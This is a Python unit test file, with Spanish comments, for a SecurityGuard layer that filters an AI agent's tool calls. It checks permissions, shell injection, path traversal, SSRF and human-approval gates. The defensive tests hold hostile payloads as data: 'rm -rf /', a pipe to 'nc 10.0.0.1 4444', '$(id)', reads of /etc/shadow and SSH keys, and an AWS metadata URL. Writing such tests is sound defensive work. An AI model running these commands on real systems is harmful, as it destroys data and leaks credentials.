"""Pruebas unitarias para el interceptor de seguridad SecurityGuard."""

import asyncio
import time
from typing import Any
from unittest.mock import MagicMock

from pydantic import BaseModel, Field

from app.models.state import PolicyDecision
from app.models.tools import AgentTool, RiskLevel, ToolResult, ToolType
from app.security.audit import SecurityAuditLogger
from app.security.guard import SecurityGuard, get_security_guard
from app.security.ssrf import SSRFValidator


class DummyArgs(BaseModel):
    query: str = Field(default="")
    target_url: str | None = Field(default=None)


def mock_tool_func(**kwargs: Any) -> ToolResult:
    return ToolResult(success=True, output=f"Executed with {kwargs}", duration_ms=10.0)


class TestSecurityGuardPermissions:
    """Pruebas de control de acceso y verificación de permisos en SecurityGuard."""

    def test_denies_when_missing_required_permissions(self) -> None:
        audit = SecurityAuditLogger(auto_persist=False)
        guard = SecurityGuard(audit_logger=audit)

        tool = AgentTool(
            name="system_reboot",
            description="Reboot system",
            category="system",
            args_schema=DummyArgs,
            func=mock_tool_func,
            required_permissions=["system:admin", "host:reboot"],
            risk_level=RiskLevel.HIGH,
        )

        eval_res = guard.evaluate(
            tool=tool,
            tool_args={"query": "reboot"},
            caller_permissions=["read:metrics"],
        )

        assert eval_res.decision == PolicyDecision.DENY
        assert "Permisos insuficientes" in eval_res.reason
        assert len(audit.get_history()) == 1
        assert audit.get_history()[0].event_type == "security_decision"
        assert audit.get_history()[0].details["decision"] == "deny"

    def test_allows_when_required_permissions_satisfied(self) -> None:
        audit = SecurityAuditLogger(auto_persist=False)
        guard = SecurityGuard(audit_logger=audit)

        tool = AgentTool(
            name="read_status",
            description="Read status",
            category="system",
            args_schema=DummyArgs,
            func=mock_tool_func,
            required_permissions=["metrics:read"],
            risk_level=RiskLevel.LOW,
        )

        eval_res = guard.evaluate(
            tool=tool,
            tool_args={"query": "cpu"},
            caller_permissions=["metrics:read", "other:perm"],
        )

        assert eval_res.decision == PolicyDecision.ALLOW
        assert len(audit.get_history()) == 1
        assert audit.get_history()[0].details["decision"] == "allow"

    def test_admin_and_wildcard_caller_satisfies_required_permissions(self) -> None:
        """Verifica que permisos administrativos o wildcard satisfagan los permisos requeridos (RBAC)."""
        audit = SecurityAuditLogger(auto_persist=False)
        guard = SecurityGuard(audit_logger=audit)

        tool = AgentTool(
            name="cluster_ops",
            description="Operaciones de cluster",
            category="system",
            args_schema=DummyArgs,
            func=mock_tool_func,
            required_permissions=["cluster:write", "infra:manage"],
            risk_level=RiskLevel.LOW,
        )

        for admin_perm in (["admin"], ["role:admin"], ["*"]):
            eval_res = guard.evaluate(
                tool=tool,
                tool_args={"query": "health"},
                caller_permissions=admin_perm,
            )
            assert eval_res.decision == PolicyDecision.ALLOW

    def test_admin_caller_cannot_bypass_directory_traversal(self) -> None:
        """Verifica que un admin con wildcard NO pueda evadir restricciones de traversal [AGENTE-SEC-06]."""
        audit = SecurityAuditLogger(auto_persist=False)
        guard = SecurityGuard(audit_logger=audit)

        tool = AgentTool(
            name="read_file",
            description="Lectura de archivo",
            category="system",
            args_schema=DummyArgs,
            func=mock_tool_func,
            required_permissions=["file:read"],
            risk_level=RiskLevel.LOW,
        )

        eval_res = guard.evaluate(
            tool=tool,
            tool_args={"path": "/etc/shadow"},
            caller_permissions=["*"],
        )
        assert eval_res.decision == PolicyDecision.DENY
        assert "ruta de sistema protegida" in eval_res.reason

    def test_admin_caller_cannot_bypass_shell_injection(self) -> None:
        """Verifica que un admin con wildcard NO pueda evadir inyección shell [AGENTE-SEC-06]."""
        audit = SecurityAuditLogger(auto_persist=False)
        guard = SecurityGuard(audit_logger=audit)

        tool = AgentTool(
            name="exec_command",
            description="Ejecutar comando",
            category="system",
            args_schema=DummyArgs,
            func=mock_tool_func,
            required_permissions=["cmd:exec"],
            risk_level=RiskLevel.LOW,
        )

        eval_res = guard.evaluate(
            tool=tool,
            tool_args={"target": "host; cat /etc/passwd"},
            caller_permissions=["admin"],
        )
        assert eval_res.decision == PolicyDecision.DENY
        assert "inyección shell" in eval_res.reason

    def test_admin_caller_cannot_bypass_hitl_governance(self) -> None:
        """Verifica que un admin con wildcard NO pueda eludir la puerta HITL para riesgo alto [AGENTE-SEC-06]."""
        audit = SecurityAuditLogger(auto_persist=False)
        guard = SecurityGuard(audit_logger=audit)

        tool = AgentTool(
            name="critical_purge",
            description="Purga crítica",
            category="ops",
            args_schema=DummyArgs,
            func=mock_tool_func,
            required_permissions=["purge:execute"],
            risk_level=RiskLevel.CRITICAL,
        )

        eval_res = guard.evaluate(
            tool=tool,
            tool_args={"target": "prod-db"},
            caller_permissions=["*"],
        )
        assert eval_res.decision == PolicyDecision.REQUIRE_HUMAN_APPROVAL
        assert "autorización humana previa" in eval_res.reason


class TestSecurityGuardInjectionAndTraversal:
    """Pruebas de detección de inyecciones de comandos shell y directory traversal."""

    def test_blocks_shell_injection_metacharacters(self) -> None:
        audit = SecurityAuditLogger(auto_persist=False)
        guard = SecurityGuard(audit_logger=audit)

        tool = AgentTool(
            name="service_manager",
            description="Manage services",
            category="system",
            args_schema=DummyArgs,
            func=mock_tool_func,
            risk_level=RiskLevel.LOW,
        )

        malicious_args = {"service_name": "nginx; rm -rf /"}
        eval_res = guard.evaluate(tool=tool, tool_args=malicious_args)

        assert eval_res.decision == PolicyDecision.DENY
        assert "inyección" in eval_res.reason.lower()

    def test_blocks_directory_traversal_to_system_paths(self) -> None:
        audit = SecurityAuditLogger(auto_persist=False)
        guard = SecurityGuard(audit_logger=audit)

        tool = AgentTool(
            name="file_reader",
            description="Read file",
            category="filesystem",
            args_schema=DummyArgs,
            func=mock_tool_func,
            risk_level=RiskLevel.LOW,
        )

        traversal_args = {"path": "/etc/shadow"}
        eval_res = guard.evaluate(tool=tool, tool_args=traversal_args)

        assert eval_res.decision == PolicyDecision.DENY
        assert "protegida" in eval_res.reason.lower()

    def test_blocks_directory_traversal_with_normalization(self) -> None:
        """Verifica que payloads de directory traversal con puntos relativos, prefijos engañosos,
        barras redundantes o codificación URL sean normalizados y bloqueados [AGENTE-SEC-03]."""
        audit = SecurityAuditLogger(auto_persist=False)
        guard = SecurityGuard(audit_logger=audit)

        tool = AgentTool(
            name="file_reader",
            description="Read file",
            category="filesystem",
            args_schema=DummyArgs,
            func=mock_tool_func,
            risk_level=RiskLevel.LOW,
        )

        malicious_paths = [
            "/tmp/../../../../etc/shadow",
            "../../../../etc/shadow",
            "foo/../../../../etc/passwd",
            "/var/run/../../etc/shadow",
            "///etc///shadow",
            "/./etc/./passwd",
            "/tmp/%2e%2e/%2e%2e/etc/shadow",
            "~root/.ssh/id_rsa",
            "/proc/self/environ",
            "/sys/kernel",
            "/run/docker.sock",
            "/dev/null",
        ]

        for path_payload in malicious_paths:
            eval_res = guard.evaluate(tool=tool, tool_args={"path": path_payload})
            assert eval_res.decision == PolicyDecision.DENY, (
                f"Fallo [AGENTE-SEC-03]: El path '{path_payload}' no fue bloqueado por SecurityGuard."
            )
            assert "protegida" in eval_res.reason.lower()

    def test_blocks_symlink_pointing_to_protected_path(self, tmp_path: Any) -> None:
        """Verifica que enlaces simbólicos apuntando a rutas de sistema protegidas sean resueltos y bloqueados."""
        audit = SecurityAuditLogger(auto_persist=False)
        guard = SecurityGuard(audit_logger=audit)

        tool = AgentTool(
            name="file_reader",
            description="Read file",
            category="filesystem",
            args_schema=DummyArgs,
            func=mock_tool_func,
            risk_level=RiskLevel.LOW,
        )

        symlink_file = tmp_path / "innocent.txt"
        symlink_file.symlink_to("/etc/passwd")

        eval_res = guard.evaluate(tool=tool, tool_args={"path": str(symlink_file)})
        assert eval_res.decision == PolicyDecision.DENY
        assert "protegida" in eval_res.reason.lower()

    def test_allows_safe_files_and_relative_paths(self) -> None:
        """Verifica que rutas legítimas de aplicación no sean bloqueadas erróneamente."""
        audit = SecurityAuditLogger(auto_persist=False)
        guard = SecurityGuard(audit_logger=audit)

        tool = AgentTool(
            name="file_reader",
            description="Read file",
            category="filesystem",
            args_schema=DummyArgs,
            func=mock_tool_func,
            risk_level=RiskLevel.LOW,
        )

        safe_paths = [
            "safe_file.txt",
            "data/results.csv",
            "/tmp/app_export.txt",
            "/home/appuser/report.md",
        ]

        for safe_path in safe_paths:
            eval_res = guard.evaluate(tool=tool, tool_args={"path": safe_path})
            assert eval_res.decision == PolicyDecision.ALLOW, (
                f"Falso positivo en ruta segura '{safe_path}': fue denegada por SecurityGuard."
            )

    def test_blocks_shell_injection_on_unrestricted_argument_names(self) -> None:
        """Verifica que argumentos con nombres arbitrarios (target, input, script, cmd, etc.)
        ya no esquivan la validación de inyección shell [AGENTE-SEC-02]."""
        audit = SecurityAuditLogger(auto_persist=False)
        guard = SecurityGuard(audit_logger=audit)

        tool = AgentTool(
            name="custom_executor",
            description="Custom execution tool",
            category="system",
            args_schema=DummyArgs,
            func=mock_tool_func,
            risk_level=RiskLevel.LOW,
        )

        unrestricted_keys_payloads = [
            ("target", "localhost && id"),
            ("input", "data | cat /etc/passwd"),
            ("script", "run.sh; rm -rf /"),
            ("query", "SELECT * FROM users; DROP TABLE--"),
            ("cmd", "sleep 5 &"),
            ("args", "`whoami`"),
            ("path", "file.txt | nc 10.0.0.1 4444"),
            ("container", "app$(id)"),
        ]

        for key, payload in unrestricted_keys_payloads:
            eval_res = guard.evaluate(tool=tool, tool_args={key: payload})
            assert eval_res.decision == PolicyDecision.DENY, (
                f"Fallo de seguridad [AGENTE-SEC-02]: El argumento '{key}' con valor '{payload}' "
                f"no fue bloqueado por el filtro de inyección shell."
            )
            assert "inyección" in eval_res.reason.lower()

    def test_blocks_nested_shell_injection(self) -> None:
        """Verifica que inyecciones dentro de estructuras anidadas (dicts, listas) sean detectadas."""
        audit = SecurityAuditLogger(auto_persist=False)
        guard = SecurityGuard(audit_logger=audit)

        tool = AgentTool(
            name="complex_runner",
            description="Complex runner tool",
            category="system",
            args_schema=DummyArgs,
            func=mock_tool_func,
            risk_level=RiskLevel.LOW,
        )

        # En lista
        eval_list = guard.evaluate(tool=tool, tool_args={"options": ["--flag", "param; id"]})
        assert eval_list.decision == PolicyDecision.DENY
        assert "inyección" in eval_list.reason.lower()

        # En diccionario anidado
        eval_dict = guard.evaluate(
            tool=tool, tool_args={"config": {"extra": {"target": "host | evil"}}}
        )
        assert eval_dict.decision == PolicyDecision.DENY
        assert "inyección" in eval_dict.reason.lower()

    def test_allows_safe_url_query_strings_but_blocks_url_shell_injection(self) -> None:
        """Verifica que URLs con query strings ('&') sean permitidas pero delimitadores shell sean bloqueados."""
        audit = SecurityAuditLogger(auto_persist=False)
        guard = SecurityGuard(audit_logger=audit)

        tool = AgentTool(
            name="api_fetcher",
            description="Fetch API data",
            category="network",
            args_schema=DummyArgs,
            func=mock_tool_func,
            risk_level=RiskLevel.LOW,
        )

        # URL válida con query string ('&' no debe ser bloqueado en URLs)
        eval_ok = guard.evaluate(
            tool=tool,
            tool_args={
                "endpoint": "https://api.cabocom.net/weather?city=Madrid&lang=es&units=metric"
            },
        )
        assert eval_ok.decision == PolicyDecision.ALLOW

        # URL con delimitador shell peligroso (';', '`', '$') debe ser bloqueado
        eval_bad = guard.evaluate(
            tool=tool,
            tool_args={"endpoint": "https://api.cabocom.net/weather; rm -rf /"},
        )
        assert eval_bad.decision == PolicyDecision.DENY
        assert "inyección" in eval_bad.reason.lower()


class TestSecurityGuardSSRF:
    """Pruebas de integración de reglas SSRF en SecurityGuard."""

    def test_blocks_ssrf_on_http_tools(self) -> None:
        audit = SecurityAuditLogger(auto_persist=False)
        ssrf = SSRFValidator(allowed_hosts=["api.cabocom.net"])
        guard = SecurityGuard(audit_logger=audit, ssrf_validator=ssrf)

        tool = AgentTool(
            name="weather_fetcher",
            description="Fetch weather",
            category="network",
            args_schema=DummyArgs,
            func=mock_tool_func,
            makes_http_requests=True,
            risk_level=RiskLevel.LOW,
        )

        # Intento de acceso a metadatos de AWS
        args = {"target_url": "http://169.254.169.254/latest/meta-data/"}
        eval_res = guard.evaluate(tool=tool, tool_args=args)

        assert eval_res.decision == PolicyDecision.DENY
        assert "ssrf" in eval_res.reason.lower()

    def test_allows_authorized_domain_on_http_tools(self) -> None:
        audit = SecurityAuditLogger(auto_persist=False)
        ssrf = SSRFValidator(allowed_hosts=["api.cabocom.net"])
        guard = SecurityGuard(audit_logger=audit, ssrf_validator=ssrf)

        tool = AgentTool(
            name="weather_fetcher",
            description="Fetch weather",
            category="network",
            args_schema=DummyArgs,
            func=mock_tool_func,
            makes_http_requests=True,
            risk_level=RiskLevel.LOW,
        )

        args = {"target_url": "https://api.cabocom.net/weather"}
        eval_res = guard.evaluate(tool=tool, tool_args=args)

        assert eval_res.decision == PolicyDecision.ALLOW


class TestSecurityGuardHITLGate:
    """Pruebas de categorización de riesgo e interrupción HITL."""

    def test_critical_and_high_risk_require_human_approval(self) -> None:
        audit = SecurityAuditLogger(auto_persist=False)
        guard = SecurityGuard(audit_logger=audit)

        tool_high = AgentTool(
            name="db_migration",
            description="Run migration",
            category="database",
            args_schema=DummyArgs,
            func=mock_tool_func,
            risk_level=RiskLevel.HIGH,
            reversible=False,
        )
        tool_critical = AgentTool(
            name="drop_cluster",
            description="Drop cluster",
            category="database",
            args_schema=DummyArgs,
            func=mock_tool_func,
            risk_level=RiskLevel.CRITICAL,
            reversible=False,
        )

        res_high = guard.evaluate(tool=tool_high, tool_args={})
        assert res_high.decision == PolicyDecision.REQUIRE_HUMAN_APPROVAL

        res_crit = guard.evaluate(tool=tool_critical, tool_args={})
        assert res_crit.decision == PolicyDecision.REQUIRE_HUMAN_APPROVAL
        assert res_crit.can_cause_data_loss is True


class TestSecurityGuardExecution:
    """Pruebas completas del interceptor execute_tool con control de timeout y concurrencia."""

    async def test_execute_tool_denied_does_not_invoke_func(self) -> None:
        audit = SecurityAuditLogger(auto_persist=False)
        guard = SecurityGuard(audit_logger=audit)

        mock_func = MagicMock()
        tool = AgentTool(
            name="rm_tool",
            description="Delete file",
            category="filesystem",
            args_schema=DummyArgs,
            func=mock_func,
            required_permissions=["admin:delete"],
        )

        res = await guard.execute_tool(
            tool=tool,
            tool_args={"path": "/etc/hosts"},
            caller_permissions=[],
        )

        assert res.success is False
        assert "DENY" in (res.error or "")
        mock_func.assert_not_called()

    async def test_execute_tool_hitl_signals_approval_needed(self) -> None:
        audit = SecurityAuditLogger(auto_persist=False)
        guard = SecurityGuard(audit_logger=audit)

        mock_func = MagicMock()
        tool = AgentTool(
            name="restart_host",
            description="Restart host",
            category="system",
            args_schema=DummyArgs,
            func=mock_func,
            risk_level=RiskLevel.HIGH,
        )

        res = await guard.execute_tool(tool=tool, tool_args={})
        assert res.success is False
        assert "REQUIRE_HUMAN_APPROVAL" in (res.error or "")
        assert res.metadata.get("requires_approval") is True
        mock_func.assert_not_called()

    async def test_execute_tool_allowed_sanitizes_and_runs(self) -> None:
        audit = SecurityAuditLogger(auto_persist=False)
        guard = SecurityGuard(audit_logger=audit)

        tool = AgentTool(
            name="echo_tool",
            description="Echo query",
            category="utility",
            args_schema=DummyArgs,
            func=mock_tool_func,
            risk_level=RiskLevel.LOW,
            tool_type=ToolType.READ,
        )

        # Entrada con espacios y caracteres nulos a sanitizar
        tool_args = {"query": "  hola mundo\x00  "}
        res = await guard.execute_tool(tool=tool, tool_args=tool_args)

        assert res.success is True
        assert "hola mundo" in str(res.output)
        # Verificar que se auditó la ejecución de la herramienta
        history = audit.get_history()
        assert any(r.event_type == "tool_executed" for r in history)

    async def test_execute_tool_async_tool_success(self) -> None:
        audit = SecurityAuditLogger(auto_persist=False)
        guard = SecurityGuard(audit_logger=audit)

        async def _async_func(**kwargs: Any) -> ToolResult:
            await asyncio.sleep(0.01)
            return ToolResult(success=True, output="async_ok")

        tool = AgentTool(
            name="async_sample",
            description="Async tool",
            category="test",
            args_schema=DummyArgs,
            func=_async_func,
            risk_level=RiskLevel.LOW,
        )

        res = await guard.execute_tool(tool=tool, tool_args={"query": "test"})
        assert res.success is True
        assert res.output == "async_ok"

    async def test_execute_tool_async_tool_timeout(self) -> None:
        audit = SecurityAuditLogger(auto_persist=False)
        guard = SecurityGuard(audit_logger=audit)

        async def _slow_async_func(**kwargs: Any) -> ToolResult:
            await asyncio.sleep(0.5)
            return ToolResult(success=True, output="never_reached")

        tool = AgentTool(
            name="slow_async_tool",
            description="Slow async tool",
            category="test",
            args_schema=DummyArgs,
            func=_slow_async_func,
            risk_level=RiskLevel.LOW,
            timeout_sec=0.1,
        )

        res = await guard.execute_tool(tool=tool, tool_args={"query": "timeout"})
        assert res.success is False
        assert "TimeoutError" in (res.error or "")
        assert res.metadata.get("timed_out") is True
        assert res.metadata.get("timeout_sec") == 0.1

        # Auditoría inmutable de fallo por timeout
        history = audit.get_history()
        assert any(
            r.event_type == "tool_executed" and r.details.get("success") is False for r in history
        )

    async def test_execute_tool_sync_tool_timeout_does_not_block_worker(self) -> None:
        audit = SecurityAuditLogger(auto_persist=False)
        guard = SecurityGuard(audit_logger=audit)

        def _slow_sync_func(**kwargs: Any) -> ToolResult:
            time.sleep(0.4)
            return ToolResult(success=True, output="never_reached")

        tool = AgentTool(
            name="slow_sync_tool",
            description="Slow sync tool",
            category="test",
            args_schema=DummyArgs,
            func=_slow_sync_func,
            risk_level=RiskLevel.LOW,
            timeout_sec=0.1,
        )

        start = time.perf_counter()
        res = await guard.execute_tool(tool=tool, tool_args={"query": "timeout"})
        elapsed = time.perf_counter() - start

        assert res.success is False
        assert "TimeoutError" in (res.error or "")
        assert res.metadata.get("timed_out") is True
        # El timeout debe cancelarse oportunamente (~0.1s - 0.25s) sin bloquear indefinidamente
        assert elapsed < 0.35


def test_singleton_guard_factory() -> None:
    g1 = get_security_guard()
    g2 = get_security_guard()
    assert g1 is g2
    assert isinstance(g1, SecurityGuard)
